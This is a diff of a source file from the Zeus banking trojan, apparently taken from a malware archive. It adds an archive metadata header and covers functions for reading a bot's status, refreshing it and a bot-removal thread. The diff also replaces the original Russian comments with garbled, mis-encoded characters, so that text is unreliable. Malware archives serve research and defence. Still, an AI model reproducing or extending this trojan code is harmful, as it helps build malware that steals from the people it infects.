@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "defines.h"
@@ -15,13 +26,13 @@
 #include "..\common\process.h"
 
 /*
-  Получение структуры с данными о текщем боте.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-  IN hwnd - родитель edit'а с ключем.
-  OUT bs  - статус бота.
+  IN hwnd - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ edit'пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT bs  - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-  Return  - true - в случаи успеха,
-            false - в случаи ошибки.
+  Return  - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+            false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool getBotStatus(HWND hwnd, BotStatus::VER1 **bs)
 {
@@ -87,9 +98,9 @@ static bool getBotStatus(HWND hwnd, BotStatus::VER1 **bs)
 }
 
 /*
-  Получение состояние бота.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-  IN hwnd - хэндл вкладки.
+  IN hwnd - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void refreshBotStatus(HWND hwnd)
 {
@@ -114,9 +125,9 @@ static void refreshBotStatus(HWND hwnd)
 }
 
 /*
-  Поток удаления бота.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-  IN p   - HWND вкладки.
+  IN p   - HWND пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   Return - 0.
 */
